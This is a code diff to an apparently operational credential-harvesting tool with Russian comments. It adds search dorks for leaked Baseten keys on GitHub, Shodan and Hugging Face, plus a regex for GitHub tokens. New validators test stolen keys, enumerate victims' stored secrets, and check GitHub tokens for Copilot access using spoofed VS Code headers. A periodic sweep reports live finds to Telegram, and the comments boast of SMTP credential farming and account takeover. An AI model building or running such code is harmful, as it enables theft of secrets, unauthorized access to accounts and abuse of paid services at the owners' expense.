@@ -744,6 +744,14 @@ KEY_PATTERNS = [
         [],
         False,
     ),
+    # 🐙 github токены: валидный = +1 в пул сканирования; с COPILOT-подпиской =
+    # бесплатные GPT/Claude через api.githubcopilot.com — отдельный алмаз
+    (
+        "github-token",
+        r"\b(gh[opsur]_[A-Za-z0-9]{20,45}|github_pat_[A-Za-z0-9_]{22,80})\b",
+        [],
+        False,
+    ),
     # Google session cookies (stealer-логи/экспорты): бег 3+ кук SID/HSID/SAPISID.
     # Разделитель [;\s] потребляется ТОЛЬКО между куками (lookahead), иначе матч
     # прилипает к следующему слову и режется boundary-чеком экстрактора.
@@ -1557,6 +1565,9 @@ class GitHubCode(Source):
             "baseten path:.env",
             '"baseten.co" "Api-Key"',
             "filename:.trussrc",
+            '"BASETEN_API_KEY" extension:yml',
+            '"baseten" "api_key" extension:toml',
+            '"inference.baseten.co" "Api-Key"',
             # 📧 ПОЧТОВАЯ ФЕРМА: plaintext SMTP-креды в .env (проверено:
             # 115 кредов за прогон, живые ящики + подписки + ATO)
             '"MAIL_PASSWORD=" "gmail.com" NOT example',
@@ -2755,6 +2766,9 @@ class Shodan(Source):
         ('http.html:"DATABASE_URL"', 4),  # жирнее: полный env-дамп
         # 🔑 BASETEN: 8.32 ключи на страницах
         ('http.html:"baseten"', 2),
+        ('http.html:"BASETEN_API_KEY"', 3),
+        ('http.html:"trussrc"', 2),  # truss CLI конфиг с api_key
+        ('http.html:"inference.baseten.co/v1"', 2),
         # ============ 🗄️ ДАМП-ВОЛНА (ZOLTRAAK-таргет): DSN всех движков ============
         ('http.html:"mongodb+srv://"', 3),  # mongo Atlas DSN с кредами
         ('http.html:"mongodb://"', 2),
@@ -3284,6 +3298,9 @@ class HFSearch(Source):
         "setup_token sk-ant",
         "mongodb srv",
         "npg neon",
+        "basetenApiKey",
+        "trussrc",
+        "BASETEN_API_KEY",
     ]
 
     def fetch(self):
@@ -8597,7 +8614,52 @@ _BASETEN_BAD = (
 
 
 def validate_baseten(key, origin):
-    """Baseten: Api-Key -> inference.baseten.co/v1/models -> кими-модели."""
+    """Baseten: Api-Key -> inference.baseten.co/v1/models -> кими-модели.
+    🔷 РЕВЕРС 2026-09: две плоскости. MANAGEMENT (api.baseten.co/v1/models):
+    403 = мёртв точно (не флачит, в отличие от inference из RU), 200 = живой
+    акк со списком деплоев. /v1/secrets — юзеры хранят ключи ПРОВАЙДЕРОВ в
+    baseten (алмазный путь вглубь)."""
+    mgmt_note = ""
+    try:
+        rm = http(
+            "GET",
+            "https://api.baseten.co/v1/models",
+            timeout=(8, 15),
+            headers={"Authorization": "Api-Key " + key},
+        )
+        if rm is not None and rm.status_code == 403:
+            return None  # management: PERMISSION_DENIED = мёртв, точка
+        if rm is not None and rm.status_code == 200:
+            mj = rm.json()
+            dm = []
+            if isinstance(mj, dict):
+                dm = [
+                    str(m.get("name") or m.get("id"))
+                    for m in (mj.get("models") or mj.get("data") or [])
+                    if isinstance(m, dict)
+                ][:10]
+            mgmt_note = "mgmt:%d деплоев" % len(dm)
+            # алмазный путь: сикреты юзера (их provider-ключи внутри baseten)
+            try:
+                rs = http(
+                    "GET",
+                    "https://api.baseten.co/v1/secrets",
+                    timeout=(6, 12),
+                    headers={"Authorization": "Api-Key " + key},
+                )
+                if rs is not None and rs.status_code == 200:
+                    sj = rs.json()
+                    names = []
+                    if isinstance(sj, dict):
+                        for s in sj.get("secrets") or sj.get("data") or []:
+                            if isinstance(s, dict) and s.get("name"):
+                                names.append(str(s["name"]))
+                    if names:
+                        mgmt_note += " | 🔐secrets: %s" % ",".join(names[:5])
+            except Exception:
+                pass
+    except Exception:
+        pass
     try:
         r = http(
             "GET",
@@ -8693,7 +8755,7 @@ def validate_baseten(key, origin):
                 "stars_listed": [m for m in models if STAR_RE.search(m)][:8],
                 "stars_working": [chat_model],
                 "balance": None,
-                "tier": "Baseten inference (rate-limited сейчас, ЖИВ)",
+                "tier": "Baseten inference (rate-limited сейчас, ЖИВ) %s" % mgmt_note,
                 "usage": {},
                 "embed": None,
                 "rerank": None,
@@ -8712,7 +8774,7 @@ def validate_baseten(key, origin):
             "stars_listed": [m for m in models if STAR_RE.search(m)][:8],
             "stars_working": [chat_model],
             "balance": None,
-            "tier": "Baseten inference (чат: %s)" % chat_model,
+            "tier": "Baseten inference (чат: %s) %s" % (chat_model, mgmt_note),
             "usage": {},
             "embed": None,
             "rerank": None,
@@ -9030,6 +9092,15 @@ def validate_db_dsn(dsn, origin):
         "db",
         "postgres",
         "database",
+        # плейсхолдеры из README/шаблонов (HF/github .env.example):
+        "host",
+        "hostname",
+        "server",
+        "your-host",
+        "your_host",
+        "db-host",
+        "example.com",
+        "your-db-host",
     ):
         return None
     if PLACEHOLDER_SUBSTR_RE.search(dsn):
@@ -9664,6 +9735,63 @@ def validate_jwt(key, origin):
     }
 
 
+def validate_github_token(key):
+    """🐙 gh-токен: /user 200 = валид (в пул сканера). Бонус-алмаз: у акка есть
+    COPILOT-подписка -> api.githubcopilot.com/models 200 = бесплатные
+    GPT/Claude/Opus через copilot-прокси."""
+    try:
+        r = http(
+            "GET",
+            "https://api.github.com/user",
+            timeout=(6, 15),
+            headers={
+                "Authorization": "Bearer " + key,
+                "Accept": "application/vnd.github+json",
+            },
+        )
+        if r.status_code != 200:
+            return None
+        login = r.json().get("login") or "?"
+    except Exception:
+        return None
+    copilot = False
+    try:
+        rc = http(
+            "GET",
+            "https://api.githubcopilot.com/models",
+            timeout=(6, 15),
+            headers={
+                "Authorization": "Bearer " + key,
+                "Editor-Version": "vscode/1.95.0",
+                "Editor-Plugin-Version": "copilot-chat/0.26.0",
+                "Copilot-Integration-Id": "vscode-chat",
+                "User-Agent": "GitHubCopilotChat/0.26.0",
+            },
+        )
+        copilot = rc.status_code == 200
+    except Exception:
+        pass
+    return {
+        "key": key,
+        "base": "https://api.githubcopilot.com"
+        if copilot
+        else "https://api.github.com",
+        "tag": "github-token",
+        "origin": "gh-token-validator",
+        "ts": time.time(),
+        "models": ["copilot: gpt/claude/gemini"] if copilot else [],
+        "n_models": 1 if copilot else 0,
+        "stars_listed": ["copilot"] if copilot else [],
+        "stars_working": ["copilot"] if copilot else [],
+        "balance": None,
+        "tier": ("🐙 COPILOT SUB @%s" % login) if copilot else ("gh token @%s" % login),
+        "usage": None,
+        "embed": None,
+        "rerank": None,
+        "status": "working" if copilot else "listed_only",
+    }
+
+
 def validate_codex(key, web=False):
     """🎫 Codex/ChatGPT: живой токен = ChatGPT Plus/Pro подписка (Codex CLI +
     веб). /backend-api/me отвечает профилем аккаунта. web=True — куки-сессия
@@ -10007,6 +10135,8 @@ def validate(key, base_hint, tag, origin):
         return validate_codex(key)
     if tag == "codex-web":
         return validate_codex(key, web=True)
+    if tag == "github-token":
+        return validate_github_token(key)
 
     bases = try_bases(base_hint, tag)
     bases = [b for b in bases if not bad_base(b)]  # мусорные base-hint'ы вон
@@ -10619,15 +10749,23 @@ def post_finding_now(v, post=True):
         )
         fat_balance = (v.get("balance") or 0) >= 1
         many_models = (v.get("n_models") or 0) >= 100
+        # quota-fresh правило: MAX с выжженным окном квоты — в стор, не в чат.
+        # окно обнуляется за ~5ч, но «победой» с нулевым остатком не спамим
+        quota_burned = "выжжено" in str(v.get("tier") or "") or "выжжено" in str(
+            v.get("note") or ""
+        )
         if (
             post
             and status in ("working", "listed_only")
             and not is_free_oat
+            and not quota_burned
             and (star_hit or valuable_tag or fat_balance or many_models)
         ):
             post_telegram(rep)
             v["_tg_posted"] = True
             return True
+        elif quota_burned:
+            log("  🟡 пропущен постинг: квота выжжена (в стор, окно обнулится)")
         elif status == "open_relay":
             log("  🔓 пропущен постинг: open_relay (эндпоинт без проверки ключей)")
         elif status == "no_balance":
@@ -11744,6 +11882,68 @@ def favicon_pivot_sweep(cycle):
             "🔍 FAVICON-PIVOT: +%d новых панелей в обход крякера (всего %d)"
             % (len(new_hosts), len(existing))
         )
+
+
+def copilot_sweep(cycle):
+    """🐙 COPILOT-СВИП: все gh-токены из стора/пула -> проверка copilot-доступа
+    (1 запрос на токен). Copilot sub = GPT/Claude/Gemini бесплатно через
+    api.githubcopilot.com. Раз в 3 цикла."""
+    if cycle % 3:
+        return
+    toks = set()
+    try:
+        with open(STORE_PATH, encoding="utf-8", errors="replace") as f:
+            for m in re.finditer(
+                r"\b(gh[opsur]_[A-Za-z0-9]{20,45}|github_pat_[A-Za-z0-9_]{22,80})\b",
+                f.read(),
+            ):
+                toks.add(m.group(0))
+    except Exception:
+        pass
+    try:
+        with open(os.path.join(HERE, "gh_pool.json"), encoding="utf-8") as f:
+            _pool = json.load(f)
+            if isinstance(_pool, list):
+                toks |= set(str(t) for t in _pool[:20])
+    except Exception:
+        pass
+    try:
+        _cfg_pool = CFG.get("github_tokens_pool") or []
+        toks |= set(_cfg_pool[:20])
+    except Exception:
+        pass
+    if not toks:
+        return
+    seen = load_seen()
+    n_cp = 0
+
+    def _val(t):
+        try:
+            return validate_github_token(t)
+        except Exception:
+            return None
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
+        for v in ex.map(_val, sorted(toks)[:60]):
+            if not v:
+                continue
+            h = khash(v["key"], v["base"])
+            if h in seen:
+                continue
+            seen.add(h)
+            if v.get("status") == "working":
+                store(v)
+                post_finding_now(v, True)
+                n_cp += 1
+            else:
+                # валидный gh-токен без copilot — тоже полезен: в пул сканера
+                log(
+                    "  🐙 gh-токен валиден (без copilot): @%s"
+                    % str(v.get("tier"))[-20:]
+                )
+    save_seen(seen)
+    if n_cp:
+        log("  🐙 copilot sweep: %d ПОДПИСОК!" % n_cp)
 
 
 def self_keysmith(cycle):
